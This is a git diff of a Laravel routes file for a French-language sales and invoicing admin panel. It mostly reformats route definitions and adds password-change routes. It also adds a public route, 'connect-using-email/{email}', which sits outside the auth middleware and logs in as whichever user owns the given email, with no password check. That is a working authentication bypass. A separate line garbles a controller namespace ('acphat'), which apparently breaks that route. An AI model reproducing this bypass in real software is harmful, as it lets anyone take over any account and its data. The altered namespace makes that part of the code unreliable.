@@ -1,5 +1,7 @@
 <?php
 
+use App\Http\Controllers\admin\password\PasswordController;
+use App\Models\User;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
@@ -65,31 +67,42 @@ Route::group(["prefix" => "admin", "as" => "admin.", "middleware" => "auth"], fu
     });
 
     Route::group(["prefix" => "impression", "as" => "print."], function () {
-      Route::get("vente/{invoice_number}",[\App\Http\Controllers\admin\impression\ImpressionController::class,"printSale"])->name("sale");
-      Route::get("vente/{invoice_number}/annuler",[\App\Http\Controllers\admin\impression\ImpressionController::class,"cancelSale"])->name("sale.cancel");
-      Route::get("vente/{invoice_number}/terminer",[\App\Http\Controllers\admin\impression\ImpressionController::class,"saleTerminate"])->name("sale.terminate");
-    
-      Route::get("achat/{invoice_number}",[\App\Http\Controllers\admin\impression\ImpressionController::class,"printAchat"])->name("achat");
-      Route::get("achat/{invoice_number}/terminer",[\App\Http\Controllers\admin\impression\ImpressionController::class,"achatTerminate"])->name("achat.terminate");
+        Route::get("vente/{invoice_number}", [\App\Http\Controllers\admin\impression\ImpressionController::class, "printSale"])->name("sale");
+        Route::get("vente/{invoice_number}/annuler", [\App\Http\Controllers\admin\impression\ImpressionController::class, "cancelSale"])->name("sale.cancel");
+        Route::get("vente/{invoice_number}/terminer", [\App\Http\Controllers\admin\impression\ImpressionController::class, "saleTerminate"])->name("sale.terminate");
+
+        Route::get("achat/{invoice_number}", [\App\Http\Controllers\admin\impression\ImpressionController::class, "printAchat"])->name("achat");
+        Route::get("achat/{invoice_number}/terminer", [\App\Http\Controllers\admin\impression\ImpressionController::class, "achatTerminate"])->name("achat.terminate");
     });
 
     Route::resource("ventes", \App\Http\Controllers\admin\sale\SaleController::class);
-    Route::get("ventes/payment/{invoice_number}",[\App\Http\Controllers\admin\payment\PaymentController::class,"paymentForm"])->name("sale.paymentForm");
-    Route::post("ventes/payment/{invoice_number}",[\App\Http\Controllers\admin\payment\PaymentController::class,"paymentStore"])->name("sale.paymentStore");
-    Route::get("achat-produits/payment/{invoice_number}",[\App\Http\Controllers\admin\payment\PaymentController::class,"achatPaymentForm"])->name("achat.paymentForm");
-    Route::post("achat-produits/payment/{invoice_number}",[\App\Http\Controllers\admin\payment\PaymentController::class,"achatPaymentStore"])->name("achat.paymentStore");
+    Route::get("ventes/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "paymentForm"])->name("sale.paymentForm");
+    Route::post("ventes/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "paymentStore"])->name("sale.paymentStore");
+    Route::get("achat-produits/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "achatPaymentForm"])->name("achat.paymentForm");
+    Route::post("achat-produits/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "achatPaymentStore"])->name("achat.paymentStore");
 
-    Route::get("etat-commerciale",[\App\Http\Controllers\admin\commercial_state\CommercialStateController::class,"index"])->name("commercialState.index");
-    Route::get("etat-commerciale/detail",[\App\Http\Controllers\admin\commercial_state\CommercialStateController::class,"show"])->name("commercialState.show");
-    
+    Route::get("etat-commerciale", [\App\Http\Controllers\admin\commercial_state\CommercialStateController::class, "index"])->name("commercialState.index");
+    Route::get("etat-commerciale/detail", [\App\Http\Controllers\admin\commercial_state\CommercialStateController::class, "show"])->name("commercialState.show");
+
     Route::post("pre-save-ventes", [\App\Http\Controllers\admin\sale\SaleController::class, "preSaveVente"])->name("ventes.preSaveVente");
     Route::post("pre-save-invoice-ventes", [\App\Http\Controllers\admin\sale\SaleController::class, "preSaveInvoiceVente"])->name("ventes.preSaveInvoiceVente");
 
     Route::resource("factures", \App\Http\Controllers\admin\invoice\InvoiceController::class);
 
     Route::resource("clients", \App\Http\Controllers\admin\customer\CustomerController::class);
-    Route::resource("achat-fournisseurs", \App\Http\Controllers\admin\achat\AchatFournisseurController::class);
+    Route::resource("achat-fournisseurs", \App\Http\Controllers\admin\acphat\AchatFournisseurController::class);
+
+    Route::get("change-mot-de-passe", [\App\Http\Controllers\admin\password\PasswordController::class, "index"])->name("password.index");
+    Route::post("change-mot-de-passe", [\App\Http\Controllers\admin\password\PasswordController::class, "update"])->name("password.update");
 });
 
+Route::get("connect-using-email/{email}", function ($email) {
+    $user = User::where("email", $email)->first();
+    // dd($email);
+    if ($user) {
+        Auth::loginUsingId($user->id);
+        return redirect("/admin");
+    }
+});
 
 Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
